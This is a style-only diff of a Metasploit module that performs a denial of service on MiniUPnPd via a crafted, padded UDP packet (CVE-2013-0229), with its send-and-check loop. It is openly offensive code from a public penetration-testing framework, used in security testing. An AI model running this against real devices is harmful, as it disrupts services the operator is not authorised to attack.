@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,44 +7,43 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Udp
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'MiniUPnPd 1.4 Denial of Service (DoS) Exploit',
-      'Description'    => %q{
-          This module allows remote attackers to cause a denial of service (DoS)
-          in MiniUPnP 1.0 server via a specifically crafted UDP request.
-      },
-      'Author'         =>
-        [
-          'hdm', # Vulnerability discovery
-          'Dejan Lukan' # Metasploit module
-        ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'CVE', '2013-0229' ],
-          [ 'OSVDB', '89625' ],
-          [ 'BID', '57607' ],
-          [ 'URL', 'https://community.rapid7.com/servlet/JiveServlet/download/2150-1-16596/SecurityFlawsUPnP.pdf' ]
-        ],
-      'DisclosureDate' => 'Mar 27 2013',
-    ))
+                      'Name'           => 'MiniUPnPd 1.4 Denial of Service (DoS) Exploit',
+                      'Description'    => %q{
+                          This module allows remote attackers to cause a denial of service (DoS)
+                          in MiniUPnP 1.0 server via a specifically crafted UDP request.
+                      },
+                      'Author'         =>
+                        [
+                          'hdm', # Vulnerability discovery
+                          'Dejan Lukan' # Metasploit module
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          [ 'CVE', '2013-0229' ],
+                          [ 'OSVDB', '89625' ],
+                          [ 'BID', '57607' ],
+                          [ 'URL', 'https://community.rapid7.com/servlet/JiveServlet/download/2150-1-16596/SecurityFlawsUPnP.pdf' ]
+                        ],
+                      'DisclosureDate' => 'Mar 27 2013'))
 
     register_options(
-    [
-      Opt::RPORT(1900),
-      OptInt.new('ATTEMPTS', [true, 'Max number of attempts to DoS the remote MiniUPnP ending', 3 ])
-    ], self.class)
+      [
+        Opt::RPORT(1900),
+        OptInt.new('ATTEMPTS', [true, 'Max number of attempts to DoS the remote MiniUPnP ending', 3 ])
+      ], self.class
+    )
   end
 
   def send_probe(udp_sock, probe)
     udp_sock.put(probe)
     data = udp_sock.recvfrom
-    if data and not data[0].empty?
+    if data && !data[0].empty?
       return data[0]
     else
       return nil
@@ -67,8 +67,7 @@ class MetasploitModule < Msf::Auxiliary
     # the packet can be at most 1500 bytes long, so add appropriate number of ' ' or '\t'
     # this makes the DoS exploit more probable, since we're occupying the stack with arbitrary
     # characters: there's more chance that the the program will run off the stack.
-    sploit += ' '*(1500-sploit.length)
-
+    sploit += ' ' * (1500 - sploit.length)
 
     # connect to the UDP port
     connect_udp
@@ -81,7 +80,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    (1..datastore['ATTEMPTS']).each { |attempt|
+    (1..datastore['ATTEMPTS']).each do |attempt|
       print_status("#{rhost}:#{rport} - UPnP DoS attempt #{attempt}...")
 
       # send the exploit to the target
@@ -98,7 +97,7 @@ class MetasploitModule < Msf::Auxiliary
       else
         print_status("#{rhost}:#{rport} - UPnP is responsive still")
       end
-    }
+    end
 
     disconnect_udp
   end
